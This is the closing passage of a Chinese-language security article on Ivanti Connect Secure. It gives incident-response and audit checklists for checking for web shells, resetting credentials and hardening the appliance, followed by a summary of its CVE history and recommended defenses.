[ ] 排查 CVE-2024-21893 SSRF
    - 检查 SAML 相关日志
    - 审查 SAML 配置
    - 检查出站连接日志

[ ] 排查 CVE-2021-22893 历史利用
    - 检查 2021 年 1-4 月的 Web 日志
    - 检查 /home/webserver/ 下的持久化文件
    - 审查所有用户凭据

[ ] 排查 Web Shell 和后门
    - find /home/webserver/ -type f -mtime -90
    - find / -name "*.php" -mtime -90 2>/dev/null
    - 检查异常进程和网络连接

[ ] 排查凭据泄露
    - 重置所有管理员密码
    - 重置所有 VPN 用户密码
    - 审查 SAML 配置和证书
    - 检查 DS 配置文件完整性

[ ] 网络隔离与加固
    - 立即升级到最新版本
    - 禁用不必要的管理接口暴露
    - 启用 MFA
    - 配置严格的访问控制策略
```

## 0x10 安全审计清单

```
[ ] Ivanti Connect Secure 已升级到最新稳定版本
[ ] 所有已知 CVE 已打补丁（对照 Ivanti 安全公告）
[ ] 管理接口仅内网可达，不暴露于互联网
[ ] 管理接口使用强密码 + 双因素认证
[ ] SSL-VPN 已配置 MFA（所有用户强制）
[ ] 已检查并清除 Web Shell 和后门
[ ] 已重置所有管理员密码
[ ] 已重置所有 VPN 用户密码
[ ] 已审查 SAML 配置和证书完整性
[ ] 已检查 /home/webserver/ 下的异常文件
[ ] 已检查 /tmp/ 和 /var/tmp/ 中的可疑脚本
[ ] 已检查系统 crontab 异常
[ ] 已检查异常网络连接和进程
[ ] 已启用 Web 服务日志并远程收集
[ ] 已启用认证日志审计
[ ] 已配置入侵防御规则（检测路径遍历、命令注入）
[ ] 已建立 VPN 连接监控基线
[ ] 已配置异常登录告警
[ ] 已备份设备配置并加密存储
[ ] 已建立 Ivanti 设备应急响应预案
[ ] 已定期进行安全基线检查
[ ] 已订阅 Ivanti 安全公告通知
[ ] 已实施网络分段策略
```

## 0x11 总结

Ivanti Connect Secure（原 Pulse Secure）的安全问题核心在于"边界设备的高价值目标属性"与"遗留代码库的持续漏洞"：

1. **预认证 RCE 持续爆发**: 从 CVE-2019-11510 到 CVE-2023-46805 + CVE-2024-21887 组合链，预认证 RCE 漏洞反复出现，且多个被 CISA KEV 收录并在野利用
2. **零日攻击常态化**: CVE-2021-22893（CVSS 10.0）在补丁发布前已被大规模利用，UNC5221 等国家级 APT 组织将 Ivanti 产品作为首选攻击入口
3. **攻击面持续扩大**: 从 Web 组件认证绕过到 SAML SSRF、GTP 状态机 RCE、栈缓冲区溢出，攻击面不断扩展
4. **品牌重塑未解决根本问题**: Pulse Secure → Ivanti Connect Secure 的品牌重塑并未解决底层代码库的架构缺陷，历史漏洞模式持续重复

防守方核心策略：
- **及时打补丁**: Ivanti 产品必须在安全公告发布后第一时间更新，关注 CISA KEV 动态
- **网络隔离**: 管理接口绝对不暴露于互联网，SSL-VPN 仅限必要访问
- **MFA 强制**: 所有管理访问和 VPN 连接必须启用双因素认证
- **持续监控**: 监控 Web 服务日志中的路径遍历、命令注入、SSRF 特征
- **应急演练**: 建立 Ivanti 设备应急响应预案，定期演练凭据重置和后门清除流程
- **纵深防御**: 在 Ivanti 设备前部署 WAF/IPS，检测并阻断已知利用模式
